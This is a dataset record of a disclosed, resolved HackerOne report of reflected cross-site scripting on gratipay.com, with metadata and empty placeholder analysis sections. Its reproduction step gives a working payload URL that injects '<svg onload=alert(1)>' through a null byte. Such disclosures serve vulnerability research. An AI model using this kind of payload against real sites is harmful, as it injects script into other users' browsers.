---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '262852'
original_report_id: '262852'
title: Reflected XSS - gratipay.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: gratipay
created_at: '2017-08-24T06:46:14.853Z'
disclosed_at: '2017-08-24T23:01:51.105Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 35
asset_identifier: https://gratipay.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS - gratipay.com

## Metadata

- HackerOne Report ID: 262852
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: gratipay
- Disclosed At: 2017-08-24T23:01:51.105Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

# Summary

I would like to report a Reflected XSS on gratipay.com.

# Browsers Verified In

  * Firefox 55.0.2 (up to date)

# Steps To Reproduce

  Goto this URL:
`https://gratipay.com/on/npm/cx%00A<svg onload=alert(1)>`

{F215426}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
